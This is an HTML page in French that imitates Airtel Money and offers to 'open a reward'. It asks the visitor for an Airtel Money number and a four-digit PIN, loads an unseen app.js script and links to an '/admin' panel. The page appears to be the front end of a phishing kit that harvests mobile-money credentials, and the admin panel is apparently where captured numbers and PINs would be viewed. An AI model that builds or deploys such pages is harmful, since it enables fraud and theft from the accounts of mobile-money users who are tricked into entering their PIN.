<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Airtel Money - Ouverture de la récompense</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="background-wrapper">
    <div class="container">
      <h1 class="main-title"><span>AIRTEL</span><span>MONEY</span></h1>
      <h2 class="form-title">Connexion du client<br>et sélection du<br>montant de la récompense</h2>
      <p class="form-subtitle">Ouverture de la récompense:</p>

      <form id="registrationForm">
        <div class="form-group">
          <input 
            type="tel"
            id="name"
            placeholder="Numéro Airtel Money"
            aria-label="Numéro Airtel Money"
            required
          >
          <span class="error" id="nameError"></span>
        </div>

        <div class="form-group">
          <input 
            type="password" 
            id="yasPin" 
            placeholder="Entrez code Pin"
            aria-label="Code PIN Airtel Money"
            required
            maxlength="4"
            pattern="\d{4}"
            inputmode="numeric"
          >
          <span class="error" id="yasPinError"></span>
        </div>

        <button type="submit" class="btn-submit">OUVRIR</button>
      </form>

      <!-- Success/Error Messages -->
      <div id="successMessage" class="message success" style="display: none;"></div>
      <div id="errorMessage" class="message error" style="display: none;"></div>

      <!-- Loading State -->
      <div id="loadingSpinner" class="spinner" style="display: none;"></div>

      <div class="admin-link">
        <a href="/admin">📊 Admin Panel</a>
      </div>
    </div>
  </div>

  <script src="app.js"></script>
</body>
</html>
